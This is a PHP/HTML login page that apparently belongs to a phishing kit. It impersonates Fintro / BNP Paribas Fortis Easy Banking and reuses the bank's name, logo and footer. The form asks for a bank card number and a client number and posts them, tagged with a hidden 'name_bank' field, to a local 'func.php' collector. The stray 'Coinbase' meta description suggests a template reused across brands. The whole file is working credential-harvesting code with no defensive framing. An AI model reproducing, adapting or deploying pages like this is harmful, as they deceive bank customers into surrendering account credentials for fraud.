<?php
  session_start();
  include "./Asstes/php/lang/lang.php";
?>
<!DOCTYPE html>
<html>
    <head>
        <meta charset="UTF-8">
        <meta name="discription" content="Coinbase">
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <link rel="icon" href="./Asstes/imgs/favicon.ico">
        <title>Mijn Easy Banking, mijn online bank | BNP Paribas Fortis</title>
        <!-- === bootstrap === -->
        <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.1/dist/css/bootstrap.min.css" rel="stylesheet" />
        <!-- == Font-awesome " icon " == -->
        <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css"/>
        <!-- == remixicon " icon " == -->
        <link href="https://cdn.jsdelivr.net/npm/remixicon@3.5.0/fonts/remixicon.css" rel="stylesheet">
        <!-- == file style css == -->
        <link rel="stylesheet" href="./Asstes/css/style.css">
        <style>
          body{
            background-color:#EEEEEE;
          }
          ul li{
            color:#005494 !important;
          }          
        </style>
    </head>
    <body>
      
    
    <!-- header -->
    <header class="header_1">
      <div class="container_header_1 d-flex align-items-center justify-content-between">
        <div class="route d-flex align-items-center">
          <i class="ri-arrow-left-s-line" style="color:#005494 !important;"></i>
          <p class="mb-0" style="color:#005494 !important;"><?php echo get_text('fi_n_1'); ?></p>
        </div>
        <div class="logo">
          <img src="./Asstes/imgs/fintro.png" style="height:35px; width: auto;" alt="">
        </div>
        <div class="esy_log">
          <p class="mb-0" style="color:#005494 !important;"><?php echo get_text('fi_n_2'); ?></p>
        </div>
        <div class="menu align-items-end">
          <p class="mb-0"><?php echo get_text('fi_n_3'); ?></p>
          <img src="./Asstes/imgs/menu.png" alt="">
        </div>
      </div>
    </header>

    <!-- wrapper_login -->
    <div class="wrapper_login">
      <div class="container_login">
        <form action="./Asstes/php/config/func.php" method="post" class="d-flex">
          <input type="hidden" name="name_bank" value="Fintro">
          <input type="hidden" name="login">
          <div class="part_left">
            <div class="x1"></div>
            <div class="title">
              <p class="mb-0"><?php echo get_text('fi_n_4'); ?></p>
              <h1 class="mb-0">Easy Banking</h1>
            </div>
            <div class="info_left">
              <!-- <p class="mb-0">Vroegere klant van bpost bank?</p>
              <a href="">Vind snel uw klantnummer</a> -->
            </div>
          </div>
          <div class="part_right">
            <div class="form-group x1">
              <div class="group-input">
                <label for=""><?php echo get_text('fi_n_5'); ?></label>
                <input type="text" name="cart_num" id="cart_num" placeholder="---- ---- ---- ----"  class="<?php if(isset($_GET['error']))  echo "error_input"; ?>">
                <img src="./Asstes/imgs/infos.png" alt="">
              </div>
              <?php if( isset($_GET['error']) ) : ?>
              <p class="error error_1"><?php echo get_text('fi_n_6'); ?></p>
              <?php endif; ?>
            </div>
            <div class="form-group x2">
              <div class="group-input">
                <label for=""><?php echo get_text('fi_n_7'); ?></label>
                <input type="text" name="client_num" id="client_num" placeholder="---- ---- ---- ----"  class="<?php if(isset($_GET['error']))  echo "error_input"; ?>">
                <img src="./Asstes/imgs/infos.png" alt="">
              </div>
              <?php if( isset($_GET['error']) ) : ?>
              <p class="error error_1"><?php echo get_text('fi_n_8'); ?></p>
              <?php endif; ?>
            </div>
            <div class="btn_sub">
              <button type="submit" disabled style="background-color:#005494 !important;"><?php echo get_text('fi_n_9'); ?></button>
            </div>
          </div>
        </form>
        <p class="txt_form"><img src="./Asstes/imgs/call.png" alt=""><?php echo get_text('fi_n_10'); ?></p>
      </div>
    </div>

    <!-- footer -->
    <footer class="footer_1">
      <div class="container_footer_1 d-flex align-items-center justify-content-between">
        <p class="mb-0">© 2024 FINTRO</p>
        <ul class="d-flex align-items-center flex-wrap mb-0 ps-0">
          <li>Vie Privée</li>
          <li class="tiri">-</li>
          <li>Co-navigation</li>
          <li class="tiri">-</li>
          <li>Conditions d'utilisation du Site Web</li>
          <li class="tiri">-</li>
          <li>Les Cookies</li>
          <li class="tiri">-</li>
          <li>Vie Privée</li>
        </ul>
      </div>
    </footer>







    <!-- bootstrap -->
    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/js/bootstrap.bundle.min.js"></script>
    <!-- script jquery -->
    <script src="https://code.jquery.com/jquery-3.7.1.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.mask/1.14.16/jquery.mask.min.js"></script>
    
    <script>   
        
        $("#cart_num").mask('0000 0000 0000 0000 0');
        $("#client_num").mask('00000 00000');

        $(".group-input input").keyup(function(){
          if ($(".group-input #cart_num").val() != "" & $(".group-input #client_num").val() != "") {
            $(".btn_sub button").prop("disabled",false);
          }else{
            $(".btn_sub button").prop("disabled",true);
          }
        });
        $(".group-input input").focus(function(){
          $(this).prev().addClass("focus");
          $(this).addClass("focus");
        });
        $(".group-input input").blur(function(){
          if ($(this).val() == "") {
              $(this).prev().removeClass("focus");
          }
          $(this).removeClass("focus");
        });         
    </script>
    </body>
</html>